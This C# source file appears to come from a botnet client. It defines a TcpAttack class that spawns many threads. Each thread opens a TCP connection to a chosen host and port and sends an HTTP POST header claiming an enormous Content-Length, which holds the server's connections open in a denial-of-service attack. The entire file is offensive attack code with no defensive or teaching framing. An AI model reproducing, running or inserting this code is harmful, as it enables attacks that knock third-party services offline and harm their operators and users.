using BotNet.Client.DDoS.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using Microsoft.Extensions.Logging;

namespace BotNet.Client.DDoS
{
  public class TcpAttack : ITcpAttack
  {
    public List<TcpClient> Clients { get; set; }
    private readonly string _host;
    private readonly int _port;

    public TcpAttack(string host, int port)
    {
      Clients = new List<TcpClient>();
      _host = host;
      _port = port;
    }

    public async Task CreateAttackAsync(int maxThreads, bool? storageThreadDetails = false)
    {
      for(int i = 0; i < maxThreads; i++)
      {
        Thread attackThread = new Thread(async () => await AttackAsync());
        attackThread.Start();
      }
    }

    public async Task AttackAsync()
    {
      var tcpClient = new TcpClient();
      Clients.Add(tcpClient);

      try
      {
        await tcpClient.ConnectAsync(_host, _port);
        var streamWriter = new StreamWriter(tcpClient.GetStream());
        streamWriter.WriteLine("POST / HTTP/1.1\r\nHost: " + _host + $"\r\nContent-length: {int.MaxValue - 1 * 5}\r\n\r\n");
        await streamWriter.FlushAsync();
        Console.WriteLine($"Attack sent {DateTime.Now.ToString("hh:mm:ss")}");
      } catch (Exception ex)
      {
        Console.WriteLine(ex?.Message.ToString());
      }
    }
  }
}
